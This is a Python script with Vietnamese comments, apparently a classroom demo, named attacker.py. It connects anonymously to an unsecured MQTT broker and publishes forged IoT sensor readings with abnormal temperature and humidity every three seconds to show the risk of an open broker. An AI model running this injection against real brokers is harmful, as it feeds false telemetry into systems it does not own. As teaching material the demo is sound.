"""
attacker.py - Giả lập tấn công chèn dữ liệu giả (Pha 1: Không bảo mật)
Gửi dữ liệu giả mạo vào cùng topic để minh họa nguy cơ khi broker mở.
"""

import json
import time
import random
import os
import socket
import threading
from datetime import datetime

import paho.mqtt.client as mqtt

# ====== CẤU HÌNH ======
BROKER_HOST = os.environ.get("BROKER_HOST", "localhost")
BROKER_PORT = int(os.environ.get("BROKER_PORT", "1883"))
TOPIC = "iot/demo/data"
FAKE_DEVICE_ID = "attacker-fake"
INTERVAL = 3  # Gửi mỗi 3 giây
connected_event = threading.Event()


def build_client_id():
    """Tạo client_id duy nhất để tránh đụng phiên chạy khác."""
    env_client_id = os.environ.get("MQTT_CLIENT_ID")
    if env_client_id:
        return env_client_id
    return f"attacker-client-{socket.gethostname()}-{os.getpid()}"


def generate_fake_data():
    """Sinh dữ liệu giả mạo với giá trị bất thường."""
    return {
        "device_id": FAKE_DEVICE_ID,
        "temperature": round(random.uniform(80.0, 120.0), 1),  # Nhiệt độ bất thường!
        "humidity": round(random.uniform(0.0, 10.0), 1),        # Độ ẩm bất thường!
        "timestamp": datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
    }


def on_connect(client, userdata, flags, rc):
    if rc == 0:
        connected_event.set()
        print(f"[ATTACKER] Kết nối thành công tới broker (anonymous)!")
        print(f"[ATTACKER] Sẽ chèn dữ liệu giả vào topic '{TOPIC}'")
    else:
        print(f"[ATTACKER] Kết nối thất bại, mã lỗi: {rc}")


def on_disconnect(client, userdata, rc):
    connected_event.clear()
    if rc != 0:
        print(f"[ATTACKER] Mất kết nối broker (rc={rc}), đang chờ reconnect...")


def main():
    client = mqtt.Client(client_id=build_client_id())
    client.on_connect = on_connect
    client.on_disconnect = on_disconnect

    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
    except ConnectionRefusedError:
        print(f"[ATTACKER] Lỗi: Không thể kết nối tới broker tại {BROKER_HOST}:{BROKER_PORT}")
        return
    except Exception as e:
        print(f"[ATTACKER] Lỗi kết nối: {e}")
        return

    client.loop_start()
    if not connected_event.wait(timeout=5):
        print("[ATTACKER] Lỗi: chưa kết nối broker, dừng gửi để tránh mất dữ liệu.")
        client.loop_stop()
        client.disconnect()
        return

    print(f"[ATTACKER] Bắt đầu gửi dữ liệu GIẢ MẠO mỗi {INTERVAL} giây...")
    print("[ATTACKER] Nhấn Ctrl+C để dừng.\n")

    try:
        count = 0
        while True:
            count += 1
            data = generate_fake_data()
            payload = json.dumps(data, ensure_ascii=False)
            result = client.publish(TOPIC, payload)

            if result.rc == mqtt.MQTT_ERR_SUCCESS:
                print(f"[ATTACKER] #{count} Đã chèn dữ liệu giả: {payload}")
            else:
                print(f"[ATTACKER] #{count} Gửi thất bại!")

            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        print("\n[ATTACKER] Đã dừng tấn công.")
    finally:
        client.loop_stop()
        client.disconnect()


if __name__ == "__main__":
    main()
